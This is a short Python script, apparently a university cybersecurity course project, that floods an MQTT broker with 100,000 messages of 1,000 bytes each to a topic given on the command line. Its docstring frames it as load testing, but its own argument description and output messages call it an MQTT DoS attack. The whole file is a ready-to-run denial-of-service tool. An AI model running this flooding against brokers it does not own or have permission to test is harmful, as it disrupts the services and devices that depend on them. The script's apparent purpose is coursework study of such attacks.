"""
Univerità degli studi di Bologna
Project for the Cybersecurity course
Academic year 2024/2025

Script for mass message publishing to an MQTT broker, useful for testing load handling capacity.  
Uses the paho-mqtt library to connect to the broker and publish a high volume of messages to a specific topic.  

Usage: python dos.py --broker <broker_ip> --port <broker_port> --topic <topic>
- broker_ip: IP address of the MQTT broker
- broker_port: Port number of the MQTT broker
- topic: Topic to publish messages to

Authors:
- Emanuele Grasso   (0001141478)
- Simone Rinaldi    (0001140193)
"""

#!/usr/bin/env python3

import argparse
import sys
import time
import paho.mqtt.client as mqtt

def get_args():
    """
    Parse command-line arguments.
    
    Returns:
        argparse.Namespace: Parsed command-line arguments containing broker IP, port, and topic.
    """
    parser = argparse.ArgumentParser(description='Perform an MQTT DoS attack')
    parser.add_argument('--broker', required=True, help='MQTT broker IP address')
    parser.add_argument('--port', type=int, required=True, help='MQTT broker port')
    parser.add_argument('--topic', required=True, help='MQTT topic to publish messages to')
    return parser.parse_args()

def dos_attack(broker, port, topic):
    """
    Sends a large number of messages to the specified MQTT broker.
    
    Args:
        broker (str): IP address of the MQTT broker.
        port (int): Port number of the MQTT broker.
        topic (str): Topic to publish messages to.
    """
    message = "A" * 1000  # Message size of 1000 bytes
    num_messages = 100000  # Number of messages to send
    
    try:
        client = mqtt.Client()
        client.connect(broker, port, 60)
        
        for i in range(num_messages):
            client.publish(topic, message)
            print(f"Sent {i+1}/{num_messages}")
            time.sleep(0.0001)
        
        client.disconnect()
    except Exception as e:
        print(f"Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    args = get_args()
    print("Starting MQTT DoS attack")
    dos_attack(args.broker, args.port, args.topic)
    print("Attack completed")
